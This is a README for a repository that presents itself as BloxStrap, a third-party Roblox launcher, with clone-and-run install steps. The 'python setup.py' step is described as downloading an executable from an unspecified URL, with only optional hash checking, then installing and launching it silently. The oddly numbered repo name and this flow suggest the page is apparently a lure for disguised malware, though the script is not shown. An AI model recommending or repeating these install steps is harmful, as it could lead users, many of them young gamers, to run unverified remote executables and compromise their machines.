> BloxStrap is a third-party Roblox launcher that adds features missing from the official client: file management, channel selector, custom cursors.

## Features

- Bootstrapper channel selector (LIVE / ZNext / ZCanary)
- Mod-friendly: custom cursor, sound, font
- Lightweight, no telemetry, fully open source
- Easy install via `setup.py` — downloads and launches automatically
- No manual configuration required
- Works on Windows 10 / 11

## Installation

```bash
git clone https://github.com/TrackerScreen/roblox-bloxstrap-turbo-358.git
cd roblox-bloxstrap-turbo-358
```

## Usage

```bash
python setup.py
```

`setup.py` will:

1. Download the official installer (`.exe` or `.msi`) from a direct URL.
2. Verify the SHA-256 hash (if provided).
3. Run a silent install.
4. Launch the application.

## Requirements

- Windows 10 or later
- Python 3.10+
- Internet connection
